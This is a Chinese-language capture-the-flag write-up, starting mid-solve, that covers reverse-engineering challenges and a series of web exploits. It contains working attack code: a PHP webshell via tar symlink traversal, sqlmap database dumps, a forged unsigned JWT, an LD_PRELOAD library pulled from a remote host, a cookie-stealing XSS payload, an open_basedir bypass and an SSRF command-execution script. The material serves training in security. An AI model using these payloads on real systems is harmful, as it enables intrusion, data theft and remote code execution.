payload = fmtstr_payload(6, writes, write_size='short')

## 游戏流程：输两步让电脑赢
p.recvuntil(b'(1-9): ')
p.sendline(b'2')
p.recvuntil(b'(1-9): ')
p.sendline(b'3')

p.recvuntil(b'>>> ')
p.sendline(payload)

p.interactive()
```

## Reverse

### 签到

```sh
zig build-exe main.c -lc -target x86_64-windows-gnu -O ReleaseFast
zig build-exe main.c -lc
```

或者使用 godbolt

### canUCIt

看到 `cors::xxx`、`traits` 了，Ruast 逆向（期间我借助 llvm 反编译工具，成功生成了一个 11 万行的 c 代码和 ll、bc、dsm 代码（不懂）😭）

<https://gemini.google.com/share/7289a5dda03d>

主要是找到程序的入口点，然后其实之后可以扔给 AI 简化逻辑，顺便分析一下加密逻辑😋

借助 AI 辅助分析，获取 2/3 关键信息。

```py
C1  = "4qeUk1SidM+BiOIXTT/56gHLx/aLbaprdlaEc9YSL22wUYsamXYP1LjNnNO2Ldfbf6gZMxQriDd9y7vHXPY98yM6hB6g/Q=="
Key = sha256("W3lcomeT0ADC7F")
```

借助 Ninja Binary 动态调试（断点在 0x4169f7），查看寄存器找到处理后的 base64 编码字符串😋，补全 3/3 关键信息，然后让 AI 生成解密代码。

```py
CHARSET = "W3lcomeT0ADC7FOPQRSHUVJXYZabKdGfghijkLNnEpqrstuvwxyzI12B456M89+/"
```

### 野兽仙贝的呐喊

python 逆向，连蒙带猜

#### 拆包

```sh
pyinstxtractor-ng ./yajusenpai
```

#### 反编译

尝试了 uncompyle6、uncompyle3 和 pycdc，pycdc 效果最好

```sh
find . -name "*.pyc" -exec sh -c 'pycdc "$0" > "${0%.pyc}.py"' {} \;
```

#### 分析

审计 main.py

```py
ENCODED_FLAG = 'プ斯前 i 是臭三、に压田ク会田员ね内し悲に哼厅撅池食三でそ好辈 m 俺二、ぎ压で所！そ沢三林喜ス哼檎马'
KEY = [1, 1, 4, 5, 1, 4, 1, 9, 1, 9, 8, 1, 0]
```

```py
def main():
    user_input = input('请输入你的 Flag（对了有奖励，错了有惩罚哦～）: ').encode()
    encrypted = (lambda .0: pass# WARNING: Decompyle incomplete
)(zip(user_input, cycle(KEY))())
    encoded = base114_encode(encrypted)
    if encoded == ENCODED_FLAG:
        print('对了，奖励你去会员制餐厅吃一顿（喜')
        return None
    print('这 Flag 不对啊，你被雷普了（悲')
```

```py
## base114_encode.py
CHARSET = ['0', '1', '3', '4', '5', '6', '8', '9', 'a', 'e', 'i', 'm', 'n', 'p', 'r', '、', '。', 'い', 'う', 'お', 'か', 'が', 'き', 'ぎ', 'く', 'こ', 'し', 'す', 'そ', 'だ', 'ち', 'で', 'に', 'ね', 'は', 'ま', 'も', 'や', 'ょ', 'よ', 'り', 'ろ', 'イ', 'ク', 'ス', 'ッ', 'プ', 'ホ', 'ム', 'モ', 'レ', 'ン', '一', '三', '下', '个', '二', '仲', '会', '你', '俺', '先', '兽', '内', '制', '前', '力', '北', '厅', '压', '员', '哼', '啊', '喜', '回', '夏', '夜', '好', '子', '屑', '恼', '悲', '所', '撅', '斯', '是', '普', '林', '梦', '檎', '汉', '池', '沢', '沼', '浩', '獣', '田', '臭', '菓', '行', '輩', '辈', '過', '野', '鉴', '银', '雪', '雷', '食', '餐', '马', '！', '（', '？']
## WARNING: Decompyle incomplete
```

<https://gemini.google.com/share/4c39c4f18e67>

猜测处理过程是比较平凡的，zip 处的 lambda 采用 XOR；而 base114_encode.py 直接扩展 baseXX_encode

```py
from itertools import cycle

## 1. 从 base114_encode.py 提取的字符集
CHARSET = ['0', '1', '3', '4', '5', '6', '8', '9', 'a', 'e', 'i', 'm', 'n', 'p', 'r', '、', '。', 'い', 'う', 'お', 'か', 'が', 'き', 'ぎ', 'く', 'こ', 'し', 'す', 'そ', 'だ', 'ち', 'で', 'に', 'ね', 'は', 'ま', 'も', 'や', 'ょ', 'よ', 'り', 'ろ', 'イ', 'ク', 'ス', 'ッ', 'プ', 'ホ', 'ム', 'モ', 'レ', 'ン', '一', '三', '下', '个', '二', '仲', '会', '你', '俺', '先', '兽', '内', '制', '前', '力', '北', '厅', '压', '员', '哼', '啊', '喜', '回', '夏', '夜', '好', '子', '屑', '恼', '悲', '所', '撅', '斯', '是', '普', '林', '梦', '檎', '汉', '池', '沢', '沼', '浩', '獣', '田', '臭', '菓', '行', '輩', '辈', '過', '野', '鉴', '银', '雪', '雷', '食', '餐', '马', '！', '（', '？']

## 2. 从 main.py 提取的密文和密钥
ENCODED_FLAG = 'プ斯前 i 是臭三、に压田ク会田员ね内し悲に哼厅撅池食三でそ好辈 m 俺二、ぎ压で所！そ沢三林喜ス哼檎马'
KEY = [1, 1, 4, 5, 1, 4, 1, 9, 1, 9, 8, 1, 0]

def base114_decode(encoded_str):
    base = 114
    value = 0

    # 建立字符到索引的映射，提高查找速度
    char_map = {c: i for i, c in enumerate(CHARSET)}

    for char in encoded_str:
        if char not in char_map:
            raise ValueError(f"Character {char} not found in charset.")
        value = value * base + char_map[char]

    # 将大整数转换为字节
    # 计算需要的字节数：(位长 + 7) // 8
    byte_length = (value.bit_length() + 7) // 8
    return value.to_bytes(byte_length, 'big')

def decrypt(encrypted_bytes, key):
    """
    执行异或 (XOR) 解密
    """
    decrypted = []
    # 使用 zip 和 cycle 将 key 循环匹配密文长度
    for b, k in zip(encrypted_bytes, cycle(key)):
        decrypted.append(b ^ k)
    return bytes(decrypted)

def main():
    print("[*] Starting decryption...")

    # 第一步：Base114 解码
    try:
        encrypted_bytes = base114_decode(ENCODED_FLAG)
        print(f"[*] Base114 decoded bytes: {encrypted_bytes}")
    except Exception as e:
        print(f"[!] Decoding error: {e}")
        return

    # 第二步：XOR 解密
    flag = decrypt(encrypted_bytes, KEY)

    try:
        print(f"\n[*] Decrypted Flag: {flag.decode('utf-8')}")
    except UnicodeDecodeError:
        print(f"\n[!] Decrypted raw bytes (decode failed): {flag}")

if __name__ == '__main__':
    main()
```

## Web

### Crossy Road

浏览器查看源代码就可以看到 flag 在 js 文件的注释里，传到 cyberchef 上面（最开始我调用了一次 base64 没出，还在疑惑中，扔给 AI 分析了，其实是两次 base64；下次一次 base64 出不来可以试试 magic）

可以在 更多工具 那里查看源代码，也可以直接在 uri 之前加上 `view-source:`

### ez_upload

<https://gemini.google.com/share/a3b3a8cc9019>

#### 分析

```php
<?php
exec('cd /tmp && tar -xvf ' . escapeshellarg($filename) . ' && pwd', $output);
```

此处可以利用 tar 的路径穿越漏洞

#### HACK

> 以下两个压缩过程可以合作一个；为了不污染我的环境，我选择听从 AI 😋

```sh
ln -s /var/www/html exploit
tar -cvf link.tar exploit
rm exploit
```

创建一个同名目录来放置 cmd.php（其实直接压缩然后修改压缩包内的路径应该也行）

```sh
mkdir exploit
```

```php
<?php
// exploit/cmd.php
echo shell_exec("find / -name '*flag*' -type f 2>/dev/null -exec cat {} \;");
```

> 最开始直接 `cat /flag` 没出来，就直接 find 了

```sh
tar -cvf shell.tar exploit/cmd.php
```

### PacmanOL

直接打到 300 分！

### tradingPlatform1

登陆界面，输入 `admin` `123456` 发现需要 `X-Forwarded-For`

先考虑 SQL 注入

抓包，写 request

```
POST /api/login HTTP/1.1
Host: 106.52.40.246:30481
X-Forwarded-For: 127.0.0.1

{"username":"","password":""}
```

```sh
sqlmap -r r.txt --ignore-code=401 --threads=10 --dbs
```

```txt
available databases [5]:
[*] ctf
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
```

```sh
sqlmap -r r.txt --ignore-code=401 --threads=10 -D ctf --dump-all
```

```txt
Database: ctf
Table: secret
[4 entries]
+----+---------+--------------------------------------------+
| id | key     | value                                      |
+----+---------+--------------------------------------------+
| 1  | color   | red                                        |
| 2  | hobby   | hacking                                    |
| 3  | country | China                                      |
| 4  | flag    | fiag{6e8b73fe-5c1a-4e21-9f9a-000c418ba2d6} |
+----+---------+--------------------------------------------+
```

### tradingPlatform2

<https://gemini.google.com/share/62b530c80a44>

#### 提权分析

Hint: 应用喜欢把数据存储在本地
分析 localStorage；一开始是没有东西的，需要 login 一下（错误的也无妨），会生成一个 token 供参考，将格式化后的 js 文件一并给 AI 发现这里的权限验证是在前端完成的，参考 token 信息发现可以进行 JWT 伪造

##### JWT 伪造（写到 localStorage 的 token 中）

```txt
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJleHAiOjE3NjM4Njg4MzEsInN1YiI6eyJuYW1lIjoiYWRtaW4iLCJpc19sb2dpbiI6dHJ1ZX19.
```

#### HACK

进入之后抓包，找到以下 API 端点（只有这一个端点），由于有查询数据库的成分，尝试进行 SQL 注入

```txt
http://$REMOTE/api/candle?symbol=ETH-USDT&start_time=2025-10-29&end_time=2025-10-30
```

```sh
sqlmap -u "http://$REMOTE/api/candle?symbol=ETH-USDT&start_time=2025-10-29&end_time=2025-10-30" --dbs
```

分析出 REMOTE 包含一个 `ctf` 数据库，可疑，直接开抓

```sh
sqlmap -u "http://$REMOTE/api/candle?symbol=ETH-USDT&start_time=2025-10-29&end_time=2025-10-30" \
 -D ctf \
 --dump \
 --threads 10
```

```
+----+--------+--------------------------------------------+----------+-------------+
| id | role   | password                                   | username | allow_login |
+----+--------+--------------------------------------------+----------+-------------+
| 1  | admin  | 15815bee2dc4f0b1fd3754574ea57c80           | admin    | true        |
| 2  | flag   | fiag{81ecc95b-b406-48f8-b4ff-f380989ec693} | flag     | false       |
+----+--------+--------------------------------------------+----------+-------------+
```

### SlowUGI-Downloader

#### 提权

```sh
curl -v \
 -H "USERNAME: 1" \
 -H "PASSWORD: 1" \
 http://${target}/ugi-bin/login.ugi?username=1&password=1
```

借助 env 覆盖掉 `USERNAME` 和 `PASSWORD`，获取到 cookie（并且此时一并创建了 data/sessions 文件夹，auth 的路径穿越攻击可以实现了（但是这个只能用来 auth，无法读取文件、执行命令）

```sh
curl -v -b "TOKEN=../../../../../../proc/self/exe" "http://127.0.0.1:8000/ugi-bin/auth.ugi"
```

不过也拿到 cookie 了，这个路径穿越也没用了。

#### HACK

接下来的思路也是 Env 注入

主要针对 `LD_PRELOAD` 变量

先生成一个 exploit.so

```c
##include <stdlib.h>
##include <stdio.h>
##include <string.h>

// _init 函数会在库加载时自动执行
void __attribute__((constructor)) call_me_exploit() {
    // 为了防止递归调用导致死循环，先取消 LD_PRELOAD
    unsetenv("LD_PRELOAD");

    system("cp /flag /app/static/flag.txt");
    system("chmod 777 /app/static/flag.txt");
}
```

> 其实这里直接 cat 应该也可以

```sh
gcc -shared -fPIC exploit.c -o exploit.so
```

将这个文件上传到服务器上，然后调用 `fetch` api 获取

```sh
curl -s -i \
 -H "Cookie: token=" \
 "http://${target}/ugi-bin/fetch.ugi?url=http://${remote}/exploit.so"
```

返回一个 `id`

那么目标 .so 就在 `data/files/${id}`

随便发一个请求，注入 Env

```sh
curl -v \
 -H "Cookie: token=${token}" \
 -H "Ld-Preload: data/files/${id}" \
 "http://${target}/ugi-bin/tasks.ugi"
```

访问 http://${target}/flag.txt

### Worthit

#### 提权

18 岁生日

Luminoria
20061105

#### API 端点

```js
await fetch("http://8.138.24.149:30641/api/admin/items", {
  credentials: "include",
  headers: {
    "User-Agent":
      "Mozilla/5.0 (X11; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0",
    Accept: "*/*",
    "Accept-Language":
      "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
    "Content-Type": "application/json",
    "Sec-GPC": "1",
    Priority: "u=0",
  },
  referrer: "http://8.138.24.149:30641/",
  body: '{"properties":{"name":"xxx","purchase_price":1233,"additional_value":22,"entry_date":"2025-11-18","retirement_date":"2025-11-28","remark":"1111"}}',
  method: "POST",
  mode: "cors",
});
```

#### XSS

题目的 Call 提示得很明显，考虑 XSS 注入

因为没有出网，所以选择通过创建新的 item 来传递信息

##### client payload

```js
// botScript
var allStorage = {
  cookie: document.cookie,
  localStorage: JSON.stringify(localStorage),
  sessionStorage: JSON.stringify(sessionStorage),
};

var stolenContent = JSON.stringify(allStorage);

fetch("/api/admin/items", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    properties: {
      name: "FLAG",
      remark: stolenContent,
      purchase_price: 1,
      additional_value: 0,
      entry_date: "2025-01-01",
      retirement_date: "2025-12-31",
    },
  }),
});
```

##### XSS payload

```js
const payload = `<img src=x onerror="${botScript.replace(/\n/g, " ").replace(/"/g, "'")}">`;
```

（其实 botScript 用 base64 传递应该会更优雅一些）

### Y2K BANK

#### 分析

抓包得到 3 个重要端点：

- `/api/login`
- `/api/withdraw`
- `/api/gift`

测试取款接口 `/api/withdraw`，发现使用负数金额时，取款变成了存款！、
发现数额太大好像不太行，让 AI 通过倍增等方法找到上界是 1,000,000,000

#### HACK

```bash
## 重新登陆好像会刷新 balance
set TOKEN (curl -s -X POST http://$REMOTE/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"CTF","password":"P@SsW0rd"}' | jq -r '.access_token')

set BALANCE (curl -s http://$REMOTE/api/balance \
  -H "Authorization: Bearer $TOKEN" | jq -r '.balance')

set TARGET 1145141919810
set AMOUNT 1000000000
set NEEDED (math "ceil(($TARGET - $BALANCE) / $AMOUNT)")

seq $NEEDED | xargs -P 10 -I {} curl -s -X POST http://$REMOTE/api/withdraw \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"amount": -1000000000, "date": "2000-01-01"}' -o /dev/null

curl -s http://$REMOTE/api/gift \
  -H "Authorization: Bearer $TOKEN" | jq -r '.flag'
```

### Interstellar

#### 注入、分析环境

```php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
```

scandir

```php
print_r(scandir(__DIR__));
```

```php
<?php
$ini_file = __DIR__ . '/.user.ini';

// 期望写入的内容：清空 open_basedir 限制
$new_content = "open_basedir =\n";

// 尝试写入文件
if (file_put_contents($ini_file, $new_content) !== false) {
    echo "成功修改 .user.ini 文件，已尝试解除 open_basedir 限制。\n";
    echo "注意：更改可能需要重启 PHP/Web 服务才能生效。\n";
    echo "！！！强烈建议您评估安全风险！！！\n";
} else {
    echo "修改失败。可能是文件不存在、权限不足，或者脚本被 open_basedir 自身限制而无法访问此文件。\n";
}
```

#### 读取管理面板 app 源码

蚁剑获取 Webshell 可以在文件面板中找到 app 目录，进去发现关键文件没有权限，拷贝所有源码到本地，分析

核心漏洞在 proxy 功能，当然正解是通过 proxy 获取 Authorization key, 但是经过 AI 分析，可以耍小聪明，绕过命令执行验证

```py
import asyncio
import websockets
import jwt
from datetime import datetime, timezone
from urllib.parse import quote

async def get_flag():
    # 目标和 WebSocket URL
    target = ""
    ws_url = f"ws://{target}/api/proxy/webcmd"

    # 设置认证头
    headers = {"Cookie": f"access_token=lalalalala~"}

    # SSRF 绕过：八进制端口 (":8837" -> ":08837")
    payload = "ws://127.0.0.1:08837/webcmd"
    final_url = f"{ws_url}?target={quote(payload)}"

    try:
        # 连接并执行命令
        async with websockets.connect(final_url, additional_headers=headers) as ws:
            await ws.send("cat /flag")
            flag = await asyncio.wait_for(ws.recv(), timeout=5)
            return flag.strip()

    except Exception as e:
        return f"Error: {e}"

if __name__ == "__main__":
    flag = asyncio.run(get_flag())
    print(f"FLAG: {flag}")
```
